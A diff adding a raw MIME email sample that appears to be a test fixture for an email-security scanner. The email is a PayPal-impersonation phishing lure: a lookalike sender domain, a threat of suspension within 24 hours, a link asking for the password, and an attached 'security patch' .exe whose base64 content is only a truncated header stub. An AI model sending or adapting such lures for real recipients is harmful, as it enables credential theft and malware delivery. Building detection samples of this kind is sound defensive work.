@@ -1,0 +1,30 @@
+From: "PayPal Account Security" <service-security@paypa1-update.xyz>
+To: recipient@company.com
+Subject: URGENT: Your PayPal Account will be suspended within 24 hours!
+Date: Mon, 28 Sep 2026 14:00:00 +0530
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_CyberShield_Boundary_98421"
+
+------=_CyberShield_Boundary_98421
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Dear Valued Customer,
+
+We detected an unauthorized sign-in attempt from an unrecognized IP address. Your PayPal account will be permanently suspended within 24 hours unless you verify your identity.
+
+Please click here to verify your account credentials and enter your password:
+http://192.168.1.100/paypal/login.php?session=emergency_verify
+
+Do not ignore this notice. Failure to comply will lead to legal and financial restriction.
+
+PayPal Security Operations Team
+------=_CyberShield_Boundary_98421
+Content-Type: application/x-msdownload; name="PayPal_Security_Patch.exe"
+Content-Disposition: attachment; filename="PayPal_Security_Patch.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAAA
+------=_CyberShield_Boundary_98421--
